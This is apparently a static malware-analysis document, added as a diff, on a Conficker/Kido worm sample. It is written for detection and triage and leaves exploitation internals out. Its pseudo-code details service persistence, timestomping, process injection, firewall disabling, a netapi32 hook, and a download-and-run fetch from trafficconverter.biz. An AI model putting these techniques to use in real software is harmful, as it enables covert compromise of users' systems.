@@ -1,0 +1,523 @@
+================================================================================================
+KIDO.SAMPLE - PROGRAM FLOW AND PSEUDO-CODE
+================================================================================================
+Companions : kido_static_analysis_report.txt   (layers; packed / encrypted / obfuscated verdict)
+             kido_worm_strings.txt             (complete string inventory of the worm payload)
+Date       : 2026-11-21
+Method     : STATIC ONLY. Stage 3 (the worm) was rebuilt in memory exactly as the UPX stub in
+             stage 2 does it (NRV2B decompress, call-filter undone, imports resolved, relocations
+             applied) and disassembled with a recursive-descent pass: 181 functions, ~17,800
+             instructions. Nothing was executed or emulated.
+Addresses  : RVAs inside the rebuilt stage-3 image (preferred base 0x10000000). "sub_06847" means
+             RVA 0x06847. Names below are my labels, not symbols from the binary.
+
+Evidence tags
+   [CODE] read at instruction level        [FN]  function level only (APIs, strings, call graph)
+   [PUB]  matches public reporting (SRI)    [INF] analyst inference
+
+SCOPE NOTE
+   This document explains WHAT the program does, WHEN it does it, and WHAT TRACES it leaves, so
+   that it can be understood, detected and triaged. It deliberately does NOT document how the
+   remote-exploitation and payload-delivery machinery is built (packet layouts, shellcode,
+   request/response handshakes, the host-name generation algorithm). Those parts are summarised
+   at the behavioural level only.
+
+
+================================================================================================
+1. THE WHOLE PROGRAM IN ONE PICTURE
+================================================================================================
+
+   LOAD CHAIN (what runs, in order)
+
+   host process loads kido.sample as a DLL
+        |
+        v
+   STAGE 1  obfuscated loader (DllMain)
+        |   decode the embedded DLL from .data -> map it by hand -> call its entry point
+        v
+   STAGE 2  UPX stub (entry RVA 0x1AB00)
+        |   decompress -> undo call filter -> resolve imports -> apply relocations -> jump to OEP
+        v
+   STAGE 3  the worm (OEP 0x133F9 -> DllMain 0x6B34)
+
+
+   WORM FLOW (stage 3)
+
+   DllMain(reason = ATTACH)                                                   sub_06B34 [CODE]
+     |-- DisableThreadLibraryCalls
+     |-- any installed keyboard layout = Ukrainian (LANGID 0x0422)?  --yes--> return, do nothing
+     v
+   init_and_guard()                                                           sub_06A3A [CODE]
+     |-- remember own path, read persisted DWORD from the registry (default value of ...\Nls)
+     |-- create mutex  "Global\<CRC32(computer name)>-7"
+     |-- hot-patch netapi32!NetpwPathCanonicalize in THIS process          (always)  sub_07B0B
+     |-- mutex already existed / access denied?
+     |        yes --> if this file is not named *.dll: schedule it for deletion at reboot; return
+     |        no  --> start main_thread
+     v
+   main_thread()                                                              sub_06847 [CODE]
+     1  seed the C PRNG from thread id, process id, perf counter and tick count
+     2  Windows 2000 ONLY: make services.exe load this DLL (remote LoadLibraryA)
+     3  if this file is not named *.dll  ->  SELF-INSTALL:
+          copy to %SystemRoot%\system32\<5-8 random letters>.dll, delete original at reboot,
+          copy kernel32.dll's file times onto the copy, register an svchost service,
+          reset System Restore
+     4  read own file into memory, note where the PE ends (overlay), LOCK the file
+     5  WSAStartup(2.2)
+     6  start HTTP server on a random TCP port 1024..9999           --failed--> skip steps 7 and 8
+     7  geo-database setup (existing file / embedded data / download from maxmind.com)
+     8  start network worker thread                                            sub_08A08
+     9  Sleep 30 minutes
+    10  start the downloader thread for trafficconverter.biz                   sub_0986A
+    11  forever: online?  --yes--> rendezvous round (250 candidate hosts), then Sleep 3 hours
+                          --no --> Sleep 60 seconds
+
+
+   AFTER A REBOOT
+     Service Control Manager starts "svchost.exe -k netsvcs" -> loads the registered ServiceDll
+     (the dropped copy of THIS WRAPPER) -> DllMain runs the same flow; the file is now named *.dll,
+     so step 3 (self-install) is skipped. The DLL has no ServiceMain export; DllMain does all
+     the work, so the service never reports a normal "running" state [INF].
+
+
+================================================================================================
+2. STAGE 2 - THE UPX STUB (exact semantics read from the stub bytes)          [CODE]
+================================================================================================
+   stub(hinst, reason, reserved):                       // RVA 0x1AB00
+       if reason != DLL_PROCESS_ATTACH: goto OEP
+       save registers
+       NRV2B-LE32 decompress  UPX1 (RVA 0x11000)  ->  UPX0 (RVA 0x1000)         // 102,159 bytes
+       // undo the x86 "call trick" filter, exactly 627 sites
+       for each byte pair (E8|E9, 0x06):
+            operand = big-endian 24-bit absolute offset
+            operand = absolute - offset_of_operand            // becomes a normal rel32
+       // import table: list stored at image+0x18000
+       for each DLL record:  h = LoadLibraryA(name)
+            for each entry:  IAT[i++] = GetProcAddress(h, name | ordinal)      // 169 imports, 12 DLLs
+       // relocations: delta-coded stream that follows the import list (1,230 entries)
+       for each entry:  dword_at(p) = byteswap(dword_at(p)) + image_start
+       VirtualProtect(image base, 0x1000, RW); clear WRITE in the UPX0/UPX1 section headers; restore
+       jmp OEP (RVA 0x133F9)
+
+
+================================================================================================
+3. STAGE 3 - THE WORM, COMPONENT BY COMPONENT
+================================================================================================
+
+3.1 Entry and guards                                                      [CODE]
+   DllMain(hinst, reason, reserved):                    // sub_06B34
+       if reason == DLL_PROCESS_ATTACH:
+           hmod = reserved ? reserved : hinst           // the worm prefers lpvReserved as "its" module
+           DisableThreadLibraryCalls(hmod)
+           if not has_ukrainian_keyboard():             // sub_067C0
+               init_and_guard(hmod)
+       return TRUE
+
+   has_ukrainian_keyboard():                            // sub_067C0
+       n = GetKeyboardLayoutList(0, NULL); buf = GlobalAlloc(n * 4)
+       GetKeyboardLayoutList(n, buf)
+       for each layout in buf:  if LOWORD(layout) == 0x0422 (LANG_UKRAINIAN): return TRUE
+       return FALSE            // any installed layout counts, not only the active one
+
+   Note on "hmod": stage 1 hands the original module handle to the worm, so GetModuleFileNameA(hmod)
+   returns the path of the on-disk WRAPPER (kido.sample), not of an in-memory image [INF]. The wrapper
+   is therefore the unit that is copied, registered as a service, and served to other hosts: every new
+   infection re-runs stage 1 -> stage 2 -> stage 3.
+
+3.2 Single instance and defensive hot-patch                               [CODE]
+   init_and_guard(hmod):                                // sub_06A3A
+       GetModuleFileNameA(hmod, g_path, 260)
+       read_state_dword(&g_counter)                     // HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Nls,
+                                                        // default value, REG_DWORD (sub_07D25; written by sub_07CD4)
+       name   = GetComputerNameA()
+       hash   = crc32(0, name, strlen(name))            // sub_0D46B: zlib crc32 with a run-time-built
+                                                        // table (sub_0D116 = make_crc_table)  [CODE]
+       mutex  = CreateMutexA(NULL, FALSE, sprintf("Global\\%u-%u", hash, 7))
+       err    = GetLastError()
+       hotpatch_NetpwPathCanonicalize()                 // runs in every instance, see below
+       if err in (ERROR_ALREADY_EXISTS, ERROR_ACCESS_DENIED):
+           if not path_ends_with(".dll"):               // sub_06810
+               MoveFileEx(g_path, NULL, MOVEFILE_DELAY_UNTIL_REBOOT)    // a duplicate copy deletes itself
+           return
+       CreateThread(main_thread)
+
+   hotpatch_NetpwPathCanonicalize():                    // sub_07B0B / sub_0799A / hook at 0x7A90
+       f = GetProcAddress(LoadLibraryA("netapi32.dll"), "NetpwPathCanonicalize")
+       tramp = VirtualAlloc(0x2C bytes, RWX)
+       copy whole instructions covering at least 5 bytes of f into tramp (length decoder sub_13080);
+       give up if one of them is a relative call/jump or an indirect call/jump; append "jmp f+N"
+       VirtualProtect(f, RWX); write "jmp hook" over f's prologue; restore protection
+       hook(path, out, outlen, prefix, type, flags):    // 6 arguments, stdcall
+           if path != NULL and (wcsstr(path, L"\\..\\") != NULL or wcslen(path) > 200):
+               return ERROR_INVALID_PARAMETER (0x57)
+           return tramp(path, out, outlen, prefix, type, flags)     // original function
+   Effect: after the worm is on a host, other attackers' MS08-067-style requests are rejected; the host
+   is "patched" in memory (not on disk) by the worm itself.  On Windows 2000 the Server service lives
+   in services.exe, which is why step 2 below injects there [INF].
+
+3.3 Main thread                                                           [CODE]
+   main_thread():                                       // sub_06847
+       seed_prng()                                      // sub_07F51
+       if LOWORD(GetVersion()) == 5:                    // Windows 2000 only (major 5, minor 0)
+           inject_into_services_exe()
+       if not path_ends_with(".dll"):
+           self_install()
+       image = read_file(g_path)                        // sub_08119
+       parse PE headers of the image -> end of last section; anything beyond = "overlay"
+       h = CreateFile(g_path, GENERIC_READ, share ...); LockFile(h, 0, filesize)    // keep it locked
+       WSAStartup(0x202)
+       if start_http_server():                          // returns the listening port or 0
+           geo_database_setup()
+           CreateThread(network_worker)                 // sub_08A08
+       Sleep(30 min)                                    // 0x1B7740 ms
+       CreateThread(scareware_downloader)               // sub_0986A
+       while TRUE:
+           if InternetGetConnectedState():
+               rendezvous_round(); Sleep(3 h)           // 0xA4CB80 ms
+           else:
+               Sleep(60 s)
+
+3.4 Self-install and persistence                                          [CODE]
+   self_install():
+       dir  = GetSystemDirectoryA()
+       name = random_lowercase(5 + rand() % 4)          // sub_07FF2   (5..8 letters)
+       dest = dir + "\\" + name + ".dll"
+       if not MoveFileA(g_path, dest):
+           if not CopyFileA(g_path, dest, TRUE): return     // give up: rest of self_install is skipped
+           MoveFileEx(g_path, NULL, MOVEFILE_DELAY_UNTIL_REBOOT)    // original removed at next boot
+       timestomp(dest)        // sub_08054: copy creation/access/write times from kernel32.dll
+       install_service(dest)  // below
+       g_path = dest
+
+   install_service(dllPath):                            // sub_0927B -> sub_09099 -> sub_08F81 -> sub_08F2C
+       svc = random name, 5..9 letters                  // length = 5 + rand() % 5
+       write  HKLM\SYSTEM\CurrentControlSet\Services\<svc> :
+                  DisplayName  = ""                     // empty on purpose [PUB]
+                  Type         = 0x20 (SERVICE_WIN32_SHARE_PROCESS)
+                  Start        = 2    (SERVICE_AUTO_START)
+                  ErrorControl = 0
+                  ImagePath    = "%SystemRoot%\system32\svchost.exe -k netsvcs"     (REG_EXPAND_SZ)
+                  ObjectName   = "LocalSystem"
+              HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters :
+                  ServiceDll   = dllPath                (REG_EXPAND_SZ)
+       append <svc> to HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SvcHost\netsvcs (REG_MULTI_SZ)
+       if everything succeeded:
+           ResetSR(0) from srclient.dll                 // clears System Restore points
+   No CreateService/StartService is used: the service is created purely through registry writes
+   and starts at the next boot.
+
+3.5 services.exe injection (Windows 2000 only)                            [CODE]
+   inject_into_services_exe():                          // sub_07CA0 / sub_07C20 / sub_07B75
+       repeat up to 20 times:
+           pid = find process "services.exe" via ToolHelp snapshot
+           if found: break;  else Sleep(1 s)
+       h = OpenProcess(VM_OPERATION | VM_WRITE | CREATE_THREAD, pid)
+       p = VirtualAllocEx(h, len(g_path) + 0x20, RWX); WriteProcessMemory(h, p, g_path)
+       CreateRemoteThread(h, LoadLibraryA /* kernel32 address in this process */, p)
+
+3.6 Local HTTP server                                                     [CODE]
+   start_http_server():                                 // sub_0C334
+       g_port = 0; CreateThread(http_accept_loop)       // sub_0C1D7
+       wait up to 100 x 500 ms for g_port != 0; return g_port
+
+   http_accept_loop():                                  // sub_0C1D7
+       require that the worm's own file image was loaded (step 4 above), else exit
+       create two random 4..8-letter tokens (consumed by the client handler)
+       port = bind_random_port(&sock)                   // below
+       listen(sock, 50); publish port in g_port
+       loop: select(); accept(); per connection -> CreateThread(client_handler)   // RVA 0xBD83
+       on exit: close socket, g_port = 0
+
+   bind_random_port():                                  // sub_0C0EF
+       srand(system-volume serial number)               // port sequence is stable for a given machine
+       repeat up to 10 times:
+           port = 1024 + rand() % 0x2310                // 1024..9999
+           ok   = open_firewall_port(port)              // COM, see below
+           if ok: Sleep(5 s)
+           else if not tried_before:                    // first failure only
+               if stop_service("SharedAccess"): Sleep(10 s)
+               tried_before = TRUE
+           sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); bind(sock, port)
+           if bind ok: break
+       reseed PRNG; return port
+
+   open_firewall_port(port):                            // sub_06D4E -> sub_06B73 -> sub_06C5C
+       CoInitializeEx; CoCreateInstance(firewall manager)
+       -> LocalPolicy -> CurrentProfile -> GloballyOpenPorts.Add(
+              { Name = "WWW", Protocol = TCP(6), Port = port, Enabled = TRUE })
+       [INF] persists on XP/2003 as an entry named WWW under SharedAccess\Parameters\FirewallPolicy\
+             <profile>\GloballyOpenPorts\List
+
+   stop_service("SharedAccess"):                        // sub_07F99  (Windows Firewall / ICS)
+       OpenSCManager; OpenService("SharedAccess", STOP); ControlService(h, SERVICE_CONTROL_STOP)
+
+   client_handler (RVA 0xBD83): serves the worm's own file image to hosts that request it and
+   updates the persisted counter in the Nls registry value after a completed transfer.  The request
+   checks and transfer details are intentionally not documented here.            [FN/CODE]
+
+3.7 Geo-database setup                                                    [CODE/FN]
+   geo_database_setup():                                // sub_0C843 (runs once)
+       lang = language id from ntdll.dll's version resource ("\VarFileInfo\Translation")   // sub_0C5AF
+       choose two random 8.3-style file names (8 letters, '.', 3 letters) in the system / temp directory
+       if a database file already exists: read it
+       else if the worm file carried data after its PE image: write that data out as the file
+       try to open it as gzip-compressed database (zlib inflate is linked in); if that fails try
+           to decompress it                              // sub_0C45B / sub_0C53D
+       if still unavailable: start a thread (RVA 0xC693) that downloads
+           http://www.maxmind.com/download/geoip/database/GeoIP.dat.gz  and wait up to 5 minutes
+   Purpose [PUB]: skip Ukrainian address space when choosing targets.
+
+3.8 Network worker                                                        [FN]
+   network_worker():                                    // sub_08A08  (1.3 KB, the largest control function)
+       wait for connectivity
+       create named events "l%08x%08x%08x" and "w%08x%08x%08x"  (instance / worker coordination)
+       enumerate local IPv4 addresses (WSAIoctl)                      // sub_07E5C
+       learn the public address:  UPnP GetExternalIPAddress  or  HTTP lookup    // sub_06FD2 / sub_0728D
+       ask the gateway to forward the HTTP-server port (UPnP AddPortMapping)     // sub_07077
+       run throttled worker threads (interlocked counters, events "n%08x%08x%08x") that
+           pick targets, apply the geo filter, fingerprint the remote OS over SMB, attempt remote
+           compromise of the Server service through IPC$ and the srvsvc / browser pipes
+           (MS08-067 class), and direct a compromised host to fetch the worm from this host's HTTP
+           server                                                         // sub_085F4 -> sub_078CC ...
+   The attack construction is intentionally not documented. Observable artefacts are listed in
+   section 6.
+
+   public_ip_lookup():                                  // sub_0728D / sub_071BA / sub_08471  [CODE/FN]
+       url = one of { http://www.getmyip.org, http://getmyip.co.uk, http://checkip.dyndns.org }  (random pick)
+       html = http_get(url)                            // WinInet InternetOpenUrlA
+       lower-case it, find "ip address", parse the dotted quad after it
+
+   upnp_port_mapping():                                 // sub_06E48 / sub_125D9 / sub_1234F / sub_12A48 / sub_12B1F ...  [FN]
+       SSDP M-SEARCH (UDP 239.255.255.250:1900) for InternetGatewayDevice / rootdevice
+       -> read the "location" header -> fetch the device description (raw HTTP GET)
+       -> find WANIPConnection / WANPPPConnection / WANCommonInterfaceConfig
+       -> SOAP: GetStatusInfo, GetExternalIPAddress, AddPortMapping, GetSpecificPortMappingEntry,
+                GetGenericPortMappingEntry, DeletePortMapping    (User-Agent: "POSIX, UPnP/1.0")
+
+3.8b Geo filter and target-language estimate                              [CODE]
+   target_language(ip):                                 // sub_0C747, called per target by the attack routine sub_078CC
+       lang = 9                                         // English
+       if no geo database is loaded, or ip is private (10/8, 172.16/12, 192.168/16)     // sub_07DCA
+           return local_os_language                     // fallback guess: assume the target runs the same language
+       country = geoip_country(db, "a.b.c.d")           // sub_0CEB4: two-letter code from GeoIP.dat
+       if country unknown:  return 9
+       if country == "UA":  return 0                    // Ukraine: language 0 = excluded (the GeoIP part of the Ukraine check)
+       return LANGID of the first of 23 groups that lists the country           // table at RVA 0x153E0
+   local_os_language():                                 // sub_0C5AF, stored in data_15744 by sub_0C843
+       lang = 9
+       q = "\VarFileInfo\Translation" of ntdll.dll's version resource;  lang = first LANGID
+       keep the full LANGID only for 0x0804 (zh-CN) and 0x0416 (pt-BR), otherwise keep the primary language (& 0x3FF)
+   Country groups (code -> language): Arabic (AE BH DZ EG IQ IR KW LB LY MA MR OM QA SA SD SY TN YE), pt-BR (BR),
+   zh-CN (CN), Chinese (HK MO SG TW), Czech (CZ), Danish (DK), Dutch (AN AW BE NL SM), Finnish (FI),
+   French (FR GF PF TF PM RE WF YT CI BF BI BJ CD CM DJ GA GN GP HT MG MQ MS NC NE SN ST TD TG),
+   German (AT DE CH LU LI), Greek (CY GR), Hungarian (HU), Hebrew (IL), Italian (IT SM VA), Japanese (JP),
+   Korean (KP KR), Norwegian (BV NO SJ), Polish (PL), Portuguese (AN CV GW MZ PT TL TP),
+   Russian (BY KG KZ MD RU SU TJ TM UA UZ), Spanish (AD AR BO CL CO CR CU EC ES GT GD HN MX NI PA PE PY SV VE),
+   Swedish (AX SE), Turkish (TR). Any other country (US, GB, AU, IN ...) stays English.
+   Use of the value [INF]: the propagation routine asks for it per target, so the worm tailors its attempt to
+   the target's likely OS language; those details are not documented here. This also answers what the
+   ntdll.dll language id is for: it is the fallback estimate when a target cannot be geolocated.
+
+3.9 Scareware downloader thread                                           [CODE]
+   scareware_downloader():                              // sub_0986A
+       loop:
+           t = GetSystemTime()
+           if t.year <= 2008 and t.day <= 1:  Sleep(1 h); continue            // date-conditioned hold
+           while InternetGetConnectedState(&flags):
+               if http_reachable("http://trafficconverter.biz"):                 // sub_085C8
+                   if download_and_run("http://trafficconverter.biz/4vir/antispyware/loadadv.exe"):   // sub_09427
+                       return                                                    // done after one success
+               Sleep(5 s, or 15 s when flags reports dial-up)                    // the ONLY pause on this path
+           // offline: there is no Sleep on this path; the thread spins (GetSystemTime +
+           // InternetGetConnectedState) until a connection is reported, then re-reads the date
+
+   http_get(url) -> buffer, length                      // sub_08471, used by every HTTP caller in the worm
+       ua = ObtainUserAgentString()                     // urlmon: the host's own IE user-agent string
+       h  = InternetOpenA(ua, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0)
+       r  = InternetOpenUrlA(h, url, NULL, 0, 0x84080300, 0)    // RELOAD|NO_CACHE_WRITE|NO_COOKIES|NO_UI|PRAGMA_NOCACHE
+       if HttpQueryInfo(r, STATUS_CODE) == 200:
+           read the body in 1 KB chunks into a 64 KB buffer that doubles when full
+       close handles; return the buffer (NULL if nothing was read)
+       // synchronous; no timeout options are set (InternetSetOption is not even imported); no Sleep inside
+   http_reachable(url):   TRUE only if http_get(url) returned HTTP 200 with a non-empty body       // sub_085C8
+   download_and_run(url): data = http_get(url); if data: verify + write + WinExec (sub_09312)       // sub_09427
+
+   RECONCILIATION: code (5-15 s) vs SRI ("cycles every 5 minutes")
+     [CODE] The pause between attempts is 5 s (15 s when InternetGetConnectedState reports a modem). No other
+            wait exists in this thread or in http_get. The only 5-minute constant in the whole worm (0x493E0)
+            is the geo-database thread wait (3.7), not this loop.
+     [CODE+INF] The request sequence is from the code; the timing outcomes follow from default WinInet
+            behaviour (the worm sets no timeouts), so what one attempt costs depends on how it fails:
+              name does not resolve (NXDOMAIN)     -> fails at once; period ~ 5 s
+              name resolves, host does not answer  -> WinInet connect timeouts (defaults; the worm sets none)
+              name resolves, host replies 200+body -> a second GET for loadadv.exe; if that body does not pass
+                                                      the verification the loop simply repeats: ~2 GETs / 5 s
+     [INF]  On the wire the cadence can look like 5 minutes. The Windows DNS client caches negative answers,
+            so after one NXDOMAIN the following attempts are answered from the local cache and put no
+            packets on the network until the entry expires. A network observer then sees about ONE DNS
+            query per negative-cache lifetime although the code retries every ~5 s. Microsoft documents 300 s
+            (5 min) for Windows 2000; sources disagree on the XP / 2003 default (300 s vs 900 s).
+            So SRI's figure is best read as an observed DNS cadence, not a timer in the code. This is an
+            inference: it has not been confirmed by dynamic observation.
+
+3.10 Rendezvous round                                                     [CODE for gates/limits, FN for the rest]
+   rendezvous_round():                                  // sub_0991B
+       t = GetSystemTime()
+       if t.year <= 2008 and t.month <= 11 and t.day <= 25: return       // dormant gate: roughly "not before 2008-11-26"
+       reseed PRNG; learn today's date from the HTTP "Date" header of one of six sites
+           { w3.org, ask.com, msn.com, yahoo.com, google.com, baidu.com }      // sub_0961F
+       build a list of 250 candidate host names under { .biz .info .org .net .com }   // sub_096EE
+       run up to 40 concurrent threads over the list:                          // sub_09818 -> sub_097BF
+           resolve the name; if it resolves: GET http://<name>/search?q=<n>&aq=<n> -> download_and_run()
+       wait up to 120 s for the batch; TerminateThread() the stragglers; free the list
+   (The name-generation algorithm is intentionally not documented; the TLD set, the 250 count and the
+   six date sites match SRI's description of variant A [PUB].)
+
+   download_and_run(url):                               // sub_09427 -> sub_09312 -> sub_09E56   [CODE]
+       data, len = http_get(url)                                                  // sub_08471
+       if len <= 0x80: fail                             // the last 128 bytes are an RSA signature block
+       body = data[0 .. len-0x80);   sig = data[len-0x80 .. len)
+       if not verify_signed_payload(sig, body): fail
+       path = GetTempFileName(system directory, prefix "0")   (falls back to GetTempPath)   // names look like 0XXXX.tmp
+       WriteFile(path, body)                            // body was decrypted in place by the verifier
+       WinExec(path, SW_HIDE); success if the return value is > 31
+
+   verify_signed_payload(sig, body):                    // sub_09E56   [CODE]
+       h1 = SHA1(body)                                  // sub_09BA7 = init 0B937 / update 0B966 / final 0BA09,
+                                                        // block function sub_09F13 (2,377 instructions, fully unrolled)
+       D  = sig ^ e mod n  as 128 big-endian bytes      // sub_09DB4 -> sub_09CF3 (square-and-multiply) -> sub_09C30
+                                                        // n = 128-byte modulus at RVA 0x152E0, e = 0xC351 (50001) at RVA 0x152D8
+       require D[0x00..0x58) == 00 01 FF ... FF         // PKCS#1 v1.5 "type 1" style padding (86 x 0xFF)
+       require D[0x6C..0x80) == h1                      // the signature covers the hash of the ENCRYPTED body
+       key = D[0x58..0x6C)                              // 20-byte RC4 key carried inside the signed block
+       RC4_decrypt_in_place(body, key)                  // sub_09B75 = sub_09AC3 (key schedule) + sub_09B20 (keystream)
+       require SHA1(body) == key                        // the key must equal the SHA-1 of the decrypted payload
+       return TRUE
+   Consequence [INF]: only blobs prepared by the holder of the matching RSA private key can run. Sinkholing
+   or spoofing a contacted server does not give code execution on infected hosts; it only exposes the
+   requests. The same gate protects the scareware download (3.9) and every rendezvous download.
+   Key material (public, a useful hunting anchor): e = 0xC351; modulus sha256 f6ac601b37bae4263dc047310d8baf5e
+   6c01495ea4fe9a34129b966a472c57c3; stored layout at RVA 0x152D8:
+       51 C3 00 00 00 00 00 00 | CF F0 7B 61 89 D7 16 E8 1B 09 ED 31 45 FE 2E E7 ...(128-byte modulus)
+
+
+================================================================================================
+4. THREAD MAP
+================================================================================================
+   Thread                      Entry RVA   Started by                 Lifetime
+   --------------------------  ----------  -------------------------  ------------------------------
+   main thread                 0x06847     init_and_guard             forever (30 min, then 3 h loop)
+   HTTP accept loop            0x0C1D7     start_http_server          until the listen socket fails
+   HTTP client handler         0x0BD83     accept loop                one per connection
+   geo-database download       0x0C693     geo_database_setup         until finished (main waits 5 min)
+   network worker              0x08A08     main thread                forever; spawns more threads
+   scareware downloader        0x0986A     main thread (after 30 min) until one successful download
+   rendezvous resolver/fetch   0x09818 ->  rendezvous_round           <= 40 at a time, 120 s per batch
+                               0x097BF
+
+
+================================================================================================
+5. TIMELINE
+================================================================================================
+   t = 0           guards, hot-patch, (Win2000: inject), self-install, file lock, WSAStartup
+   t = 0 .. 50 s   HTTP server comes up (waits up to 50 s for a port); firewall opened or SharedAccess stopped
+   t = 0 .. 5 min  geo-database set-up (waits up to 5 min for a download)
+   t = +30 min     scareware downloader thread starts; first rendezvous round follows
+                   downloader: attempt every ~5 s (15 s dial-up) until one success; busy-loops while
+                   offline; wire cadence of its DNS lookups ~ one per negative-cache lifetime [INF] (3.9)
+   every 3 hours   rendezvous round (250 candidate hosts, <= 40 threads, <= 2 min per batch) while online
+   offline         re-check every 60 s
+   date gates      rendezvous dormant until about 2008-11-26; downloader holds 1 h per loop while
+                   year <= 2008 and day <= 1
+
+
+================================================================================================
+6. TRACES EACH COMPONENT LEAVES (host and network)
+================================================================================================
+   Component             Host artefacts                                    Network artefacts
+   --------------------  ------------------------------------------------  ---------------------------
+   guards                mutex Global\<n>-7 (n = CRC32 of computer name)   -
+                         HKLM\...\CurrentVersion\Nls default DWORD
+   hot-patch             netapi32 prologue = E9 jump (in memory)           MS08-067-style paths rejected
+   self-install          system32\<5-8 letters>.dll with kernel32 times;   -
+                         original deleted at reboot; file locked
+   service               Services\<5-9 letters> (empty DisplayName,        -
+                         Type 0x20, Start 2, LocalSystem, Parameters\ServiceDll);
+                         name added to SvcHost\netsvcs; System Restore reset
+   Win2000 injection     services.exe thread running LoadLibraryA          -
+   HTTP server           listening TCP port 1024..9999; firewall entry     inbound HTTP, 200 OK with
+                         "WWW"; or SharedAccess service stopped            Content-Type image/jpeg
+   UPnP                  -                                                 SSDP M-SEARCH, SOAP
+                                                                           AddPortMapping to the gateway
+   public-IP lookup      -                                                 GET getmyip.org / getmyip.co.uk /
+                                                                           checkip.dyndns.org
+   geo database          temp / system-dir file with random 8.3 name       GET maxmind.com GeoIP.dat.gz
+   rendezvous            -                                                 date lookups on 6 sites, then up
+                                                                           to 250 DNS names / round under
+                                                                           .biz .info .org .net .com
+   scareware             temp file 0XXXX.tmp via WinExec;                  trafficconverter.biz: one DNS query
+                         svchost CPU spin while offline                    per negative-cache lifetime; if it
+                                                                           resolves, GETs every ~5 s
+   propagation           -                                                 SMB sessions to \\<ip>\IPC$,
+                                                                           RPC on srvsvc / browser pipes
+
+
+================================================================================================
+7. FUNCTION MAP (key functions, rebuilt-image RVAs)
+================================================================================================
+   133F9 _DllMainCRTStartup (CRT)         06B34 DllMain                      067C0 has_ukrainian_keyboard
+   06A3A init_and_guard                   06810 not_dll_named (0 if *.dll)    06847 main_thread
+   07B0B hotpatch_NetpwPathCanonicalize   0799A install_inline_hook          07A90 hook body
+   13080 instruction-length decoder       07CA0 inject_into_services_exe      07C20 find_process
+   07B75 remote LoadLibraryA injection    0927B install_service               09099 write_service_registry
+   08F81 add_to_svchost_group             08F2C reset_system_restore          07FF2 random_lowercase
+   08054 timestomp_from_kernel32          08119 read_file_into_memory         081A0 write_buffer_to_file
+   07F51 seed_prng                        07D84 volume_serial                 0D46B crc32 (zlib, dyn. table)
+   07D25 read_state_dword                 07CD4 write_state_dword             0C334 start_http_server
+   0C1D7 http_accept_loop                 0C0EF bind_random_port              0BD83 http_client_handler
+   06D4E open_firewall_port (COM)         07F99 stop_service SharedAccess     0C843 geo_database_setup
+   0C5AF os_language_from_ntdll           0C693 geo_db_download_thread        08A08 network_worker
+   07E5C enum_local_addresses             0728D public_ip_lookup              071BA parse_ip_from_html
+   08471 http_get (WinInet)               06E48..07077 upnp helpers           125D9 ssdp_discover
+   1234F soap_call                        12A48 GetExternalIPAddress          12B1F AddPortMapping
+   085F4 / 078CC / 07607 / 0BADB          propagation attempt chain (not documented in detail)
+   0986A scareware_downloader             0991B rendezvous_round              0961F date_from_web
+   096EE name list builder                09818 resolve_candidate             097BF fetch_candidate
+   09427 download_and_run                 09312 verify_then_write_and_winexec 09E56 verify_signed_payload
+   09DB4 rsa_public_op                    09CF3 modexp                        09C30 modmul (shift-and-subtract)
+   09C0B bit_length                       09BD6 bignum_compare                09BA7 sha1(data,len) -> 20 bytes
+   0B937 sha1_init                        0B966 sha1_update                   0BA09 sha1_final
+   09F13 sha1_block (unrolled)            09B75 rc4_crypt                     09AC3 rc4_key_schedule
+   09B20 rc4_keystream_xor                0C747 target_language               07DCA is_not_private_ip
+   07DF7 is_routable_unicast              0CEB4 geoip_country                 0E1BD zlib inflate
+   113EF zlib deflate                     115F5 raw HTTP GET (UPnP)           11801 URL splitter
+   0C45B..0CEB4 GeoIP database reader
+   09460 http_date_header_fetch           07364 build_self_url_buffer (XOR 0xC4)  0D6B5 zlib window slide
+
+
+================================================================================================
+8. WHAT IS NOT DOCUMENTED, AND OPEN ITEMS
+================================================================================================
+   - Exploitation, payload-delivery and host-name-generation internals: summarised only (scope note).
+   RESOLVED since the first version of this document:
+   - Verification routines: RSA-1024 (e = 50001) signature + SHA-1 + RC4, details in 3.10.
+   - ntdll.dll language id: fallback estimate of a target's OS language, details in 3.8b.
+   - Downloader timing: 3.9. The code pause is 5-15 s; SRI's ~5 minutes is explained as the DNS
+     negative-cache cadence. That explanation stays an inference (conflicting sources give 300 s or 900 s
+     for the XP / 2003 default) and needs dynamic confirmation.
+   - Stage-1 base relocation: stage 1 applies HIGHLOW fixups (delta = actual - preferred base) when it cannot
+     get 0x10000000 for stage 2 (main report 6.9).
+   - capa 9.2.1 cross-check (run statically on the analysis VM against the rebuilt stage-3 PE, main report 9.1):
+     70 rules matched and every one reconciles with this document; it adds no new capability. It does name
+     three functions that were missing from the map: 0x9460 fetches a URL, requires HTTP 200 and reads the
+     "Date" header (the date lookup of 3.10), 0x7364 builds the self-URL buffer "http://%d.%d.%d.%d:%d/%s"
+     and applies a single-byte XOR (0xC4) to part of it, and 0xD6B5 is zlib's deflate window slide. capa
+     labels the last two "RC4 PRGA"; both are false positives. The real RC4 (3.10) matches no capa rule.
+   CHARACTERISED, NOT EXPLAINED:
+   - The 7,424-byte block in stage 1 and the 415-byte HTML trailer (main report 6.7): neither is read by
+     any layer; the block is statistically uniform random under every decoding tried. Most likely build-time
+     junk / collection artefact respectively. The worm's own "data after the PE image" handling (3.3, 3.7)
+     acts on the file it was loaded from, which here is the wrapper plus its HTML trailer.
+   NOT DONE:
+   - Any dynamic confirmation. Nothing was executed (the analysis VM was used for static tools only).
+   - kido.zip: skipped, as requested.
